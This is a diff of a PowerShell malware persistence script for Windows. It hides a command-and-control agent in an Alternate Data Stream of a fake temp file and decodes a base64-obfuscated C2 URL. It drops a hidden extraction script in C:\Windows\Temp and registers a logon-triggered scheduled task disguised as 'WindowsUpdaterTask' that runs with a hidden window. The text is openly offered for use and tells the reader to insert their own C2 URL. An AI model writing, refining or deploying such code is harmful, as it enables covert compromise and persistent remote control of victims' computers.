@@ -7,19 +7,18 @@ if (-not $agentPath) {
 }
 
 # ============================================================
-# Configuration – Change YOUR_C2_URL to your actual C2 base
+# CONFIGURATION – CHANGE THIS TO YOUR C2 URL
 # ============================================================
 $encodedUrl = "aHR0cHM6Ly9jMi1zZXJ2ZXJ2Mi1xeHZsLm9ucmVuZGVyLmNvbQ=="
 $c2BaseUrl = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedUrl))
 
 # ============================================================
-# 1. Carrier file in C:\Windows\Temp
+# 1. Carrier file in C:\Windows\Temp (writable by all users)
 # ============================================================
-$carrierDir = "C:\Windows\Temp"
-$carrierFile = "$carrierDir\~DF539A.tmp"
+$carrierFile = "C:\Windows\Temp\~DF539A.tmp"
 $streamName = "thumbs.db"
 
-# Create carrier if it doesn't exist
+# Ensure carrier file exists (create if missing)
 if (-not (Test-Path $carrierFile)) {
     Set-Content -Path $carrierFile -Value "[Temp File]" -Encoding ASCII
     Write-Output "[+] Created carrier file: $carrierFile"
@@ -28,7 +27,7 @@ if (-not (Test-Path $carrierFile)) {
 }
 
 # ============================================================
-# 2. Hide the real agent in ADS
+# 2. Hide the real agent in an Alternate Data Stream (ADS)
 # ============================================================
 Write-Output "[+] Hiding real agent in ADS..."
 $agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
@@ -37,12 +36,10 @@ $hiddenPath = "$carrierFile`:$streamName"
 Write-Output "[+] Real agent hidden at: $hiddenPath"
 
 # ============================================================
-# 3. Build the scheduled task action (with self‑healing)
+# 3. Create the extraction script (run.ps1) in C:\Windows\Temp
 # ============================================================
-$taskName = "WindowsUpdaterTask"
-
-# The command that will run at logon
-$extractCommand = @"
+$scriptPath = "C:\Windows\Temp\run.ps1"
+$extractCode = @"
 `$carrierFile = '$carrierFile'
 `$streamName = '$streamName'
 `$tempPath = "`$env:TEMP\agent.exe"
@@ -68,7 +65,6 @@ try {
 # Recreate carrier file with hidden agent for next boot
 if (Test-Path `$tempPath) {
     `$newBytes = [System.IO.File]::ReadAllBytes(`$tempPath)
-    # Ensure carrier file exists
     if (-not (Test-Path `$carrierFile)) {
         Set-Content -Path `$carrierFile -Value "[Temp File]" -Encoding ASCII
     }
@@ -77,36 +73,41 @@ if (Test-Path `$tempPath) {
 }
 "@
 
-# Escape the command for use in a scheduled task action
-$commandLine = "powershell.exe -WindowStyle Hidden -Command `"$extractCommand`""
+Set-Content -Path $scriptPath -Value $extractCode -Encoding ASCII -Force
+# Hide the script file (optional)
+attrib +h $scriptPath 2>$null
+Write-Output "[+] Extraction script created: $scriptPath"
 
 # ============================================================
-# 4. Create/update scheduled task via COM
+# 4. Create/update scheduled task via COM (no password prompt)
 # ============================================================
+$taskName = "WindowsUpdaterTask"
+
 try {
+    # Connect to Task Scheduler
     $taskService = New-Object -ComObject Schedule.Service
     $taskService.Connect()
     $rootFolder = $taskService.GetFolder("\")
 
-    # Delete existing task if any
+    # Delete any existing task
     try { $rootFolder.DeleteTask($taskName, 0) } catch { }
 
-    # Create new task definition
+    # Create a new task definition
     $taskDefinition = $taskService.NewTask(0)
     $taskDefinition.RegistrationInfo.Description = "Windows Updater Task"
     $taskDefinition.Principal.UserId = $env:USERNAME
-    $taskDefinition.Principal.LogonType = 3  # TASK_LOGON_INTERACTIVE_TOKEN
+    $taskDefinition.Principal.LogonType = 3   # TASK_LOGON_INTERACTIVE_TOKEN
 
-    # Add logon trigger
-    $trigger = $taskDefinition.Triggers.Create(9)  # TASK_TRIGGER_LOGON
+    # Add a logon trigger
+    $trigger = $taskDefinition.Triggers.Create(9)   # TASK_TRIGGER_LOGON
     $trigger.UserId = $env:USERNAME
 
-    # Add action
-    $action = $taskDefinition.Actions.Create(0)  # TASK_ACTION_EXEC
+    # Add the action: run the extraction script
+    $action = $taskDefinition.Actions.Create(0)   # TASK_ACTION_EXEC
     $action.Path = "powershell.exe"
-    $action.Arguments = "-WindowStyle Hidden -Command `"$extractCommand`""
+    $action.Arguments = "-WindowStyle Hidden -File `"$scriptPath`""
 
-    # Register task (6 = UpdateOrCreate)
+    # Register the task (6 = UpdateOrCreate)
     $rootFolder.RegisterTaskDefinition($taskName, $taskDefinition, 6, $null, $null, 3) | Out-Null
     Write-Output "[+] Scheduled task '$taskName' created via COM. Agent will run at next logon."
 } catch {
